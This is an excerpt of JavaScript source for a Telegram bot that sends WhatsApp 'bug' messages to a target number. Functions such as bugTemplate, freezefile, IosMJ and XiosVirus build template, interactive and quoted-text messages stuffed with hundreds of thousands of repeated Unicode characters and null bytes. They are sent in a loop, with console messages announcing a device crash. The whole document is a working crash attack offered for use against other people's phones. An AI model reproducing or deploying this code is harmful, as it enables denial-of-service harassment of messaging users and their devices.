...
bot.command("xcsystemui", checkWhatsAppConnection, async ctx => {
  ...
  for (let i = 0; i < 5; i++) {
    ...
    await bugTemplate(target);
    await bugPoll(target);
    await bugContact(target);
  }
                ...
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            ...
                            body: {
                                text: "ꦾ".repeat(160000) + "ꦾ".repeat(160000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
...
console.log(chalk.red.bold('Crash System Device By ☆ CellaCrash'))
   ...
   console.log(chalk.redBright("Send XeonBugV1"))
	}
...
console.log(chalk.redBright("Senden XeonBugV2"))
}
...
let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(165000) + "ྫྷ".repeat(165000);
			await cella.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
...
async function freezefile(target, QBug, Ptcp = true) {
    let virtex = "Wanna With Yours :D " + "ꦾ".repeat(165000);
    await cella.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
        ...
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "Please.." + "ꦾ".repeat(150000) + "\u0000".repeat(180000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
        ...
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "Wanna With Yours. :D" + "ꦾ".repeat(3350000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
...
async function bugTemplate(target) {
 let xbug1 = 'ꦾ'.repeat(75000);
    await cella.relayMessage(target, {
        templateMessage: {
            hydratedTemplate: {
                hydratedContentText: xbug1,
                hydratedButtons: [
                    { index: 1, quickReplyButton: { displayText: xbug1, id: xbug1 } },
                    { index: 2, quickReplyButton: { displayText: xbug1, id: xbug1 } },
                ],
            },
        },
    },
    ...
    async function IosMJ(target, Ptcp = false) {
      await cella.relayMessage(
        ...
        {
          extendedTextMessage: {
            text: "Wanna With Yours :)" + "ꦾ".repeat(165000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
              ...
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦".repeat(165000),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
    ...
    async function XiosVirus(target) {
      cella.relayMessage(
        ...
        {
          extendedTextMessage: {
            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(165000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(165000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
